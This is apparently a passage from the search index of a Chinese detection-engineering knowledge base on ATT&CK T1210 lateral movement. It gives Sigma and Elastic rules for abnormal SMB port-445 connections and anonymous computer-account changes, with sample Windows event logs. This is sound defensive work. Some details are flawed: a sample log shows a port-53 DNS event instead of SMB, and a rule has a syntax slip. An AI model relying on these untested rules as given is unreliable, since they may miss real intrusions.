\u653b\u51fb\u8005\u4e00\u65e6\u8fdb\u5165\u7f51\u7edc\uff0c\u4fbf\u53ef\u80fd\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u83b7\u5f97\u5bf9\u5185\u90e8\u7cfb\u7edf\u7684\u672a\u6388\u6743\u8bbf\u95ee\u3002\u5f53\u653b\u51fb\u8005\u5229\u7528\u7a0b\u5e8f\uff0c\u670d\u52a1\u6216\u64cd\u4f5c\u7cfb\u7edf\u8f6f\u4ef6\u6216\u5185\u6838\u672c\u8eab\u5185\u7684\u7f16\u7a0b\u9519\u8bef\u6765\u6267\u884c\u653b\u51fb\u8005\u63a7\u5236\u7684\u4ee3\u7801\u65f6\uff0c\u5c31\u4f1a\u5229\u7528\u8f6f\u4ef6\u6f0f\u6d1e\u3002\u5efa\u7acb\u7acb\u8db3\u70b9\u540e\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u7684\u76ee\u6807\u662f\u6a2a\u5411\u79fb\u52a8\u4ee5\u5b9e\u73b0\u5bf9\u8fdc\u7a0b\u7cfb\u7edf\u7684\u8bbf\u95ee\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u9700\u8981\u786e\u5b9a\u8fdc\u7a0b\u7cfb\u7edf\u662f\u5426\u5904\u4e8e\u6613\u53d7\u653b\u51fb\u72b6\u6001\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u670d\u52a1\u626b\u63cf\u6216\u5176\u4ed6\u53d1\u73b0\u65b9\u6cd5\u6765\u5b8c\u6210\uff0c\u4ee5\u5bfb\u627e\u5728\u7f51\u7edc\u4e2d\u90e8\u7f72\u7684\u5e38\u89c1\u6613\u53d7\u653b\u51fb\u8f6f\u4ef6\uff0c\u68c0\u6d4b\u6216\u5305\u542b\u8fdc\u7a0b\u5229\u7528\u7684\u6f0f\u6d1e\u6216\u5b89\u5168\u8f6f\u4ef6\u3002\u670d\u52a1\u5668\u53ef\u80fd\u662f\u6a2a\u5411\u79fb\u52a8\u4e2d\u7684\u9ad8\u4ef7\u503c\u76ee\u6807\uff0c\u4f46\u662f\u5982\u679c\u7aef\u70b9\u7cfb\u7edf\u63d0\u4f9b\u8bbf\u95ee\u5176\u4ed6\u8d44\u6e90\u7684\u65b9\u5f0f\uff0c\u5219\u7aef\u70b9\u7cfb\u7edf\u4e5f\u53ef\u80fd\u5904\u4e8e\u5371\u9669\u4e4b\u4e2d\u3002 \u5e38\u89c1\u670d\u52a1\uff08\u4f8b\u5982SMB\u548cRDP\uff09\u4ee5\u53ca\u53ef\u80fd\u5728\u5185\u90e8\u7f51\u7edc\uff08\u4f8b\u5982MySQL\uff09\u548cWeb\u670d\u52a1\u5668\u670d\u52a1\u4e2d\u4f7f\u7528\u7684\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5b58\u5728\u591a\u4e2a\u4f17\u6240\u5468\u77e5\u7684\u6f0f\u6d1e\u3002 \u6839\u636e\u6613\u53d7\u653b\u51fb\u7684\u8fdc\u7a0b\u670d\u52a1\u7684\u6743\u9650\u7ea7\u522b\uff0c\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u7531\u4e8e\u6a2a\u5411\u79fb\u52a8\u5229\u7528\u800c\u5b9e\u73b0\u5bf9\u7279\u6743\u5347\u7ea7\u7684\u5229\u7528\u3002 \u6d4b\u8bd5\u6848\u4f8b \u8bc6\u522b\u901a\u8fc7\u7aef\u53e3445\u8fdb\u884c\u7f51\u7edc\u8fde\u63a5\u7684\u53ef\u7591\u8fdb\u7a0b\u3002Windows\u6587\u4ef6\u5171\u4eab\u901a\u5e38\u901a\u8fc7\u670d\u52a1\u5668\u6d88\u606f\u5757\uff08SMB\uff09\u5b9e\u73b0\uff0cSMB\u4f7f\u7528\u7aef\u53e3445\u5728\u4e3b\u673a\u4e4b\u95f4\u8fdb\u884c\u901a\u4fe1\u3002\u5f53\u5408\u6cd5\u65f6\uff0c\u8fd9\u4e9b\u7f51\u7edc\u8fde\u63a5\u7531\u5185\u6838\u5efa\u7acb\u3002\u5efa\u7acb445/tcp\u8fde\u63a5\u7684\u8fdb\u7a0b\u53ef\u80fd\u662f\u7aef\u53e3\u626b\u63cf\u7a0b\u5e8f\u3001\u6f0f\u6d1e\u5229\u7528\u6216\u6a2a\u5411\u79fb\u52a8\u7684\u53ef\u7591\u7528\u6237\u7ea7\u8fdb\u7a0b\u3002 \u4ec5\u63d0\u4f9b\u7b80\u5355\u6848\u4f8b\uff1a \u5728Windows\u4e2d\u5220\u9664/\u5207\u6362\u5df2\u5efa\u7acb\u7684Samba\u5171\u4eab\u8fde\u63a5 \u68c0\u6d4b\u65e5\u5fd7 windows\u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\uff0c\u4ec5\u63d0\u4f9b\u68c0\u6d4b\u89c4\u5219\u76f8\u5173\u7684\u65e5\u5fd7\u793a\u4f8b windows server 2016/win10 The Windows Filtering Platform has allowed a connection. Application Information: Process ID: 1752 Application Name: \\device\\harddiskvolume1\\windows\\system32\\dns.exe Network Information: Direction: Inbound Source Address: 10.45.45.103 Source Port: 53 Destination Address: 10.45.45.103 Destination Port: 50146 Protocol: 17 Filter Information: Filter Run-Time ID: 5 Layer Name: Receive/Accept Layer Run-Time ID: 44 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u68c0\u6d4b\u5f02\u5e38\u7684SMB\u94fe\u63a5\u884c\u4e3a description: \u901a\u8fc7windows\u65e5\u5fd7\u68c0\u6d4b\u5f02\u5e38\u7684SMB\u94fe\u63a5\u884c\u4e3a tags: T1210 status: experimental references: - https://www.elastic.co/guide/en/siem/guide/current/direct-outbound-smb-connection.html logsource: product: windows service: security detection: selection1: EventID: 5156 Destination Port: 445 selection2: Destination Address: - 127.0.0.1 - ::1 selection3: Process ID: 4 condition: selection1 and not selection2 and not selection3) level: medium Elastic rule query event.action:\"Network connection detected (rule: NetworkConnect)\" and destination.port:445 and not process.pid:4 and not destination.ip:(127.0.0.1 or \"::1\") \u5efa\u8bae \u89c4\u5219\u672a\u7ecf\u7ebf\u4e0a\u6d4b\u8bd5\uff0c\u8c28\u614e\u4f7f\u7528\uff0c\u4f46\u662f\u6211\u76f8\u4fe1\u5b83\u80fd\u591f\u5f88\u597d\u7684\u5e2e\u52a9\u4f60\u53d1\u73b0\u7f51\u5185\u7684\u5a01\u80c1\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1210 https://attack.mitre.org/techniques/T1210 \u68c0\u6d4b\u5f02\u5e38\u7684SMB\u94fe\u63a5\u884c\u4e3a https://www.elastic.co/guide/en/siem/guide/current/direct-outbound-smb-connection.html windows\u4e8b\u4ef6ID-5156\u6837\u4f8b https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=5156 \u5728Windows\u4e2d\u5220\u9664/\u5207\u6362\u5df2\u5efa\u7acb\u7684Samba\u5171\u4eab\u8fde\u63a5 https://blog.csdn.net/u013038461/article/details/39934061","title":"T1210-win-\u5f02\u5e38\u7684SMB\u94fe\u63a5\u884c\u4e3a"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#t1210-win-smb","text":"","title":"T1210-win-\u5f02\u5e38\u7684SMB\u94fe\u63a5\u884c\u4e3a"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#attck","text":"\u653b\u51fb\u8005\u4e00\u65e6\u8fdb\u5165\u7f51\u7edc\uff0c\u4fbf\u53ef\u80fd\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u83b7\u5f97\u5bf9\u5185\u90e8\u7cfb\u7edf\u7684\u672a\u6388\u6743\u8bbf\u95ee\u3002\u5f53\u653b\u51fb\u8005\u5229\u7528\u7a0b\u5e8f\uff0c\u670d\u52a1\u6216\u64cd\u4f5c\u7cfb\u7edf\u8f6f\u4ef6\u6216\u5185\u6838\u672c\u8eab\u5185\u7684\u7f16\u7a0b\u9519\u8bef\u6765\u6267\u884c\u653b\u51fb\u8005\u63a7\u5236\u7684\u4ee3\u7801\u65f6\uff0c\u5c31\u4f1a\u5229\u7528\u8f6f\u4ef6\u6f0f\u6d1e\u3002\u5efa\u7acb\u7acb\u8db3\u70b9\u540e\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u7684\u76ee\u6807\u662f\u6a2a\u5411\u79fb\u52a8\u4ee5\u5b9e\u73b0\u5bf9\u8fdc\u7a0b\u7cfb\u7edf\u7684\u8bbf\u95ee\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u9700\u8981\u786e\u5b9a\u8fdc\u7a0b\u7cfb\u7edf\u662f\u5426\u5904\u4e8e\u6613\u53d7\u653b\u51fb\u72b6\u6001\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u670d\u52a1\u626b\u63cf\u6216\u5176\u4ed6\u53d1\u73b0\u65b9\u6cd5\u6765\u5b8c\u6210\uff0c\u4ee5\u5bfb\u627e\u5728\u7f51\u7edc\u4e2d\u90e8\u7f72\u7684\u5e38\u89c1\u6613\u53d7\u653b\u51fb\u8f6f\u4ef6\uff0c\u68c0\u6d4b\u6216\u5305\u542b\u8fdc\u7a0b\u5229\u7528\u7684\u6f0f\u6d1e\u6216\u5b89\u5168\u8f6f\u4ef6\u3002\u670d\u52a1\u5668\u53ef\u80fd\u662f\u6a2a\u5411\u79fb\u52a8\u4e2d\u7684\u9ad8\u4ef7\u503c\u76ee\u6807\uff0c\u4f46\u662f\u5982\u679c\u7aef\u70b9\u7cfb\u7edf\u63d0\u4f9b\u8bbf\u95ee\u5176\u4ed6\u8d44\u6e90\u7684\u65b9\u5f0f\uff0c\u5219\u7aef\u70b9\u7cfb\u7edf\u4e5f\u53ef\u80fd\u5904\u4e8e\u5371\u9669\u4e4b\u4e2d\u3002 \u5e38\u89c1\u670d\u52a1\uff08\u4f8b\u5982SMB\u548cRDP\uff09\u4ee5\u53ca\u53ef\u80fd\u5728\u5185\u90e8\u7f51\u7edc\uff08\u4f8b\u5982MySQL\uff09\u548cWeb\u670d\u52a1\u5668\u670d\u52a1\u4e2d\u4f7f\u7528\u7684\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5b58\u5728\u591a\u4e2a\u4f17\u6240\u5468\u77e5\u7684\u6f0f\u6d1e\u3002 \u6839\u636e\u6613\u53d7\u653b\u51fb\u7684\u8fdc\u7a0b\u670d\u52a1\u7684\u6743\u9650\u7ea7\u522b\uff0c\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u7531\u4e8e\u6a2a\u5411\u79fb\u52a8\u5229\u7528\u800c\u5b9e\u73b0\u5bf9\u7279\u6743\u5347\u7ea7\u7684\u5229\u7528\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#_1","text":"\u8bc6\u522b\u901a\u8fc7\u7aef\u53e3445\u8fdb\u884c\u7f51\u7edc\u8fde\u63a5\u7684\u53ef\u7591\u8fdb\u7a0b\u3002Windows\u6587\u4ef6\u5171\u4eab\u901a\u5e38\u901a\u8fc7\u670d\u52a1\u5668\u6d88\u606f\u5757\uff08SMB\uff09\u5b9e\u73b0\uff0cSMB\u4f7f\u7528\u7aef\u53e3445\u5728\u4e3b\u673a\u4e4b\u95f4\u8fdb\u884c\u901a\u4fe1\u3002\u5f53\u5408\u6cd5\u65f6\uff0c\u8fd9\u4e9b\u7f51\u7edc\u8fde\u63a5\u7531\u5185\u6838\u5efa\u7acb\u3002\u5efa\u7acb445/tcp\u8fde\u63a5\u7684\u8fdb\u7a0b\u53ef\u80fd\u662f\u7aef\u53e3\u626b\u63cf\u7a0b\u5e8f\u3001\u6f0f\u6d1e\u5229\u7528\u6216\u6a2a\u5411\u79fb\u52a8\u7684\u53ef\u7591\u7528\u6237\u7ea7\u8fdb\u7a0b\u3002 \u4ec5\u63d0\u4f9b\u7b80\u5355\u6848\u4f8b\uff1a \u5728Windows\u4e2d\u5220\u9664/\u5207\u6362\u5df2\u5efa\u7acb\u7684Samba\u5171\u4eab\u8fde\u63a5","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#_2","text":"windows\u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#_4","text":"\u6682\u65e0\uff0c\u4ec5\u63d0\u4f9b\u68c0\u6d4b\u89c4\u5219\u76f8\u5173\u7684\u65e5\u5fd7\u793a\u4f8b windows server 2016/win10 The Windows Filtering Platform has allowed a connection. Application Information: Process ID: 1752 Application Name: \\device\\harddiskvolume1\\windows\\system32\\dns.exe Network Information: Direction: Inbound Source Address: 10.45.45.103 Source Port: 53 Destination Address: 10.45.45.103 Destination Port: 50146 Protocol: 17 Filter Information: Filter Run-Time ID: 5 Layer Name: Receive/Accept Layer Run-Time ID: 44","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#sigma","text":"title: \u68c0\u6d4b\u5f02\u5e38\u7684SMB\u94fe\u63a5\u884c\u4e3a description: \u901a\u8fc7windows\u65e5\u5fd7\u68c0\u6d4b\u5f02\u5e38\u7684SMB\u94fe\u63a5\u884c\u4e3a tags: T1210 status: experimental references: - https://www.elastic.co/guide/en/siem/guide/current/direct-outbound-smb-connection.html logsource: product: windows service: security detection: selection1: EventID: 5156 Destination Port: 445 selection2: Destination Address: - 127.0.0.1 - ::1 selection3: Process ID: 4 condition: selection1 and not selection2 and not selection3) level: medium","title":"sigma\u89c4\u5219"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#elastic-rule-query","text":"event.action:\"Network connection detected (rule: NetworkConnect)\" and destination.port:445 and not process.pid:4 and not destination.ip:(127.0.0.1 or \"::1\")","title":"Elastic rule query"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#_6","text":"\u89c4\u5219\u672a\u7ecf\u7ebf\u4e0a\u6d4b\u8bd5\uff0c\u8c28\u614e\u4f7f\u7528\uff0c\u4f46\u662f\u6211\u76f8\u4fe1\u5b83\u80fd\u591f\u5f88\u597d\u7684\u5e2e\u52a9\u4f60\u53d1\u73b0\u7f51\u5185\u7684\u5a01\u80c1\u3002","title":"\u5efa\u8bae"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#_7","text":"MITRE-ATT&CK-T1210 https://attack.mitre.org/techniques/T1210 \u68c0\u6d4b\u5f02\u5e38\u7684SMB\u94fe\u63a5\u884c\u4e3a https://www.elastic.co/guide/en/siem/guide/current/direct-outbound-smb-connection.html windows\u4e8b\u4ef6ID-5156\u6837\u4f8b https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=5156 \u5728Windows\u4e2d\u5220\u9664/\u5207\u6362\u5df2\u5efa\u7acb\u7684Samba\u5171\u4eab\u8fde\u63a5 https://blog.csdn.net/u013038461/article/details/39934061","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/","text":"T1210-win-\u68c0\u6d4b\u5230\u533f\u540d\u8ba1\u7b97\u673a\u8d26\u6237\u66f4\u6539\u7684\u4f7f\u7528 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u4e00\u65e6\u8fdb\u5165\u7f51\u7edc\uff0c\u4fbf\u53ef\u80fd\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u83b7\u5f97\u5bf9\u5185\u90e8\u7cfb\u7edf\u7684\u672a\u6388\u6743\u8bbf\u95ee\u3002\u5f53\u653b\u51fb\u8005\u5229\u7528\u7a0b\u5e8f\uff0c\u670d\u52a1\u6216\u64cd\u4f5c\u7cfb\u7edf\u8f6f\u4ef6\u6216\u5185\u6838\u672c\u8eab\u5185\u7684\u7f16\u7a0b\u9519\u8bef\u6765\u6267\u884c\u653b\u51fb\u8005\u63a7\u5236\u7684\u4ee3\u7801\u65f6\uff0c\u5c31\u4f1a\u5229\u7528\u8f6f\u4ef6\u6f0f\u6d1e\u3002\u5efa\u7acb\u7acb\u8db3\u70b9\u540e\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u7684\u76ee\u6807\u662f\u6a2a\u5411\u79fb\u52a8\u4ee5\u5b9e\u73b0\u5bf9\u8fdc\u7a0b\u7cfb\u7edf\u7684\u8bbf\u95ee\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u9700\u8981\u786e\u5b9a\u8fdc\u7a0b\u7cfb\u7edf\u662f\u5426\u5904\u4e8e\u6613\u53d7\u653b\u51fb\u72b6\u6001\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u670d\u52a1\u626b\u63cf\u6216\u5176\u4ed6\u53d1\u73b0\u65b9\u6cd5\u6765\u5b8c\u6210\uff0c\u4ee5\u5bfb\u627e\u5728\u7f51\u7edc\u4e2d\u90e8\u7f72\u7684\u5e38\u89c1\u6613\u53d7\u653b\u51fb\u8f6f\u4ef6\uff0c\u68c0\u6d4b\u6216\u5305\u542b\u8fdc\u7a0b\u5229\u7528\u7684\u6f0f\u6d1e\u6216\u5b89\u5168\u8f6f\u4ef6\u3002\u670d\u52a1\u5668\u53ef\u80fd\u662f\u6a2a\u5411\u79fb\u52a8\u4e2d\u7684\u9ad8\u4ef7\u503c\u76ee\u6807\uff0c\u4f46\u662f\u5982\u679c\u7aef\u70b9\u7cfb\u7edf\u63d0\u4f9b\u8bbf\u95ee\u5176\u4ed6\u8d44\u6e90\u7684\u65b9\u5f0f\uff0c\u5219\u7aef\u70b9\u7cfb\u7edf\u4e5f\u53ef\u80fd\u5904\u4e8e\u5371\u9669\u4e4b\u4e2d\u3002 \u5e38\u89c1\u670d\u52a1\uff08\u4f8b\u5982SMB\u548cRDP\uff09\u4ee5\u53ca\u53ef\u80fd\u5728\u5185\u90e8\u7f51\u7edc\uff08\u4f8b\u5982MySQL\uff09\u548cWeb\u670d\u52a1\u5668\u670d\u52a1\u4e2d\u4f7f\u7528\u7684\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5b58\u5728\u591a\u4e2a\u4f17\u6240\u5468\u77e5\u7684\u6f0f\u6d1e\u3002 \u6839\u636e\u6613\u53d7\u653b\u51fb\u7684\u8fdc\u7a0b\u670d\u52a1\u7684\u6743\u9650\u7ea7\u522b\uff0c\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u7531\u4e8e\u6a2a\u5411\u79fb\u52a8\u5229\u7528\u800c\u5b9e\u73b0\u5bf9\u7279\u6743\u5347\u7ea7\u7684\u5229\u7528\u3002 \u6d4b\u8bd5\u6848\u4f8b \u53c2\u8003\u8d44\u6599\u5982\u4e0b\uff1a https://www.lares.com/blog/from-lares-labs-defensive-guidance-for-zerologon-cve-2020-1472/ \u68c0\u6d4b\u65e5\u5fd7 windows\u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\uff0c\u4ec5\u63d0\u4f9b\u68c0\u6d4b\u89c4\u5219\u76f8\u5173\u7684\u65e5\u5fd7\u793a\u4f8b windows server 2016/win10 EventID\uff1a4742 A computer account was changed. Subject: Security ID: ACME\\Administrator Account Name: Administrator Account Domain: ACME Logon ID: 0x27a79 Computer Account That Was Changed: Security ID: S-1-5-21-3108364787-189202583-342365621-1109 Account Name: WS2321$ Account Domain: ACME Changed Attributes: SAM Account Name: - Display Name: - User Principal Name: - Home Directory: - Home Drive: - Script Path: - Profile Path: - User Workstations: - Password Last Set: - Account Expires: - Primary Group ID: - AllowedToDelegateTo: - Old UAC Value: 0x85 New UAC Value: 0x84 User Account Control: Account Enabled User Parameters: - SID History: - Logon Hours: - DNS Host Name: - Service Principal Names: - Additional Information: Privileges: - EventID\uff1a4624 An account was successfully logged on. Subject: Security ID: SYSTEM Account Name: DESKTOP-LLHJ389$ Account Domain: WORKGROUP Logon ID: 0x3E7 Logon Information: Logon Type: 7 Restricted Admin Mode: - Virtual Account: No Elevated Token: No Impersonation Level: Impersonation New Logon: Security ID: AzureAD\\RandyFranklinSmith Account Name: rsmith@montereytechgroup.com Account Domain: AzureAD Logon ID: 0xFD5113F Linked Logon ID: 0xFD5112A Network Account Name: - Network Account Domain: - Logon GUID: {00000000-0000-0000-0000-000000000000} Process Information: Process ID: 0x30c Process Name: C:\\Windows\\System32\\lsass.exe Network Information: Workstation Name: DESKTOP-LLHJ389 Source Network Address: - Source Port: - Detailed Authentication Information: Logon Process: Negotiat Authentication Package: Negotiate Transited Services: - Package Name (NTLM only): - Key Length: 0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u68c0\u6d4b\u5230\u533f\u540d\u8ba1\u7b97\u673a\u8d26\u6237\u66f4\u6539\u7684\u4f7f\u7528 description: \u901a\u8fc7windows\u5b89\u5168\u65e5\u5fd7\uff0c\u68c0\u6d4b\u533f\u540d\u7528\u6237\u66f4\u6539\u7684\u4f7f\u7528\u3002 tags: T1210 status: experimental references: - https://github.com/splunk/security_content/blob/develop/detections/endpoint/detect_computer_changed_with_anonymous_account.yml logsource: product: windows service: security detection: selection: EventID: - \u201c4742\u201d - \u201c4624\u201d Account Name: \u201cANONYMOUSLOGON\u201d Logon Type: 3 condition: selection level: medium \u5efa\u8bae \u6b64\u641c\u7d22\u9700\u8981\u542f\u7528\u5ba1\u6838\u8ba1\u7b97\u673a\u5e10\u6237\u7ba1\u7406\u5728\u7cfb\u7edf\u4e0a\u751f\u6210\u4e8b\u4ef6ID4742\u3002\u6211\u4eec\u5f3a\u70c8\u5efa\u8bae\u60a8\u6307\u5b9a\u7279\u5b9a\u4e8e\u73af\u5883\u7684\u914d\u7f6e\uff08\u7d22\u5f15\uff0c\u6e90\uff0c\u6e90\u7c7b\u578b\u7b49\uff09Windows\u4e8b\u4ef6\u65e5\u5fd7\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1210 https://attack.mitre.org/techniques/T1210 \u68c0\u6d4b\u5230\u533f\u540d\u8ba1\u7b97\u673a\u8d26\u6237\u66f4\u6539\u7684\u4f7f\u7528 https://github.com/splunk/security_content/blob/develop/detections/endpoint/detect_computer_changed_with_anonymous_account.yml","title":"T1210-win-\u68c0\u6d4b\u5230\u533f\u540d\u8ba1\u7b97\u673a\u8d26\u6237\u66f4\u6539\u7684\u4f7f\u7528"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/#t1210-win-","text":"","title":"T1210-win-\u68c0\u6d4b\u5230\u533f\u540d\u8ba1\u7b97\u673a\u8d26\u6237\u66f4\u6539\u7684\u4f7f\u7528"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/#attck","text":"\u653b\u51fb\u8005\u4e00\u65e6\u8fdb\u5165\u7f51\u7edc\uff0c\u4fbf\u53ef\u80fd\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u83b7\u5f97\u5bf9\u5185\u90e8\u7cfb\u7edf\u7684\u672a\u6388\u6743\u8bbf\u95ee\u3002\u5f53\u653b\u51fb\u8005\u5229\u7528\u7a0b\u5e8f\uff0c\u670d\u52a1\u6216\u64cd\u4f5c\u7cfb\u7edf\u8f6f\u4ef6\u6216\u5185\u6838\u672c\u8eab\u5185\u7684\u7f16\u7a0b\u9519\u8bef\u6765\u6267\u884c\u653b\u51fb\u8005\u63a7\u5236\u7684\u4ee3\u7801\u65f6\uff0c\u5c31\u4f1a\u5229\u7528\u8f6f\u4ef6\u6f0f\u6d1e\u3002\u5efa\u7acb\u7acb\u8db3\u70b9\u540e\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u7684\u76ee\u6807\u662f\u6a2a\u5411\u79fb\u52a8\u4ee5\u5b9e\u73b0\u5bf9\u8fdc\u7a0b\u7cfb\u7edf\u7684\u8bbf\u95ee\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u9700\u8981\u786e\u5b9a\u8fdc\u7a0b\u7cfb\u7edf\u662f\u5426\u5904\u4e8e\u6613\u53d7\u653b\u51fb\u72b6\u6001\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u670d\u52a1\u626b\u63cf\u6216\u5176\u4ed6\u53d1\u73b0\u65b9\u6cd5\u6765\u5b8c\u6210\uff0c\u4ee5\u5bfb\u627e\u5728\u7f51\u7edc\u4e2d\u90e8\u7f72\u7684\u5e38\u89c1\u6613\u53d7\u653b\u51fb\u8f6f\u4ef6\uff0c\u68c0\u6d4b\u6216\u5305\u542b\u8fdc\u7a0b\u5229\u7528\u7684\u6f0f\u6d1e\u6216\u5b89\u5168\u8f6f\u4ef6\u3002\u670d\u52a1\u5668\u53ef\u80fd\u662f\u6a2a\u5411\u79fb\u52a8\u4e2d\u7684\u9ad8\u4ef7\u503c\u76ee\u6807\uff0c\u4f46\u662f\u5982\u679c\u7aef\u70b9\u7cfb\u7edf\u63d0\u4f9b\u8bbf\u95ee\u5176\u4ed6\u8d44\u6e90\u7684\u65b9\u5f0f\uff0c\u5219\u7aef\u70b9\u7cfb\u7edf\u4e5f\u53ef\u80fd\u5904\u4e8e\u5371\u9669\u4e4b\u4e2d\u3002 \u5e38\u89c1\u670d\u52a1\uff08\u4f8b\u5982SMB\u548cRDP\uff09\u4ee5\u53ca\u53ef\u80fd\u5728\u5185\u90e8\u7f51\u7edc\uff08\u4f8b\u5982MySQL\uff09\u548cWeb\u670d\u52a1\u5668\u670d\u52a1\u4e2d\u4f7f\u7528\u7684\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5b58\u5728\u591a\u4e2a\u4f17\u6240\u5468\u77e5\u7684\u6f0f\u6d1e\u3002 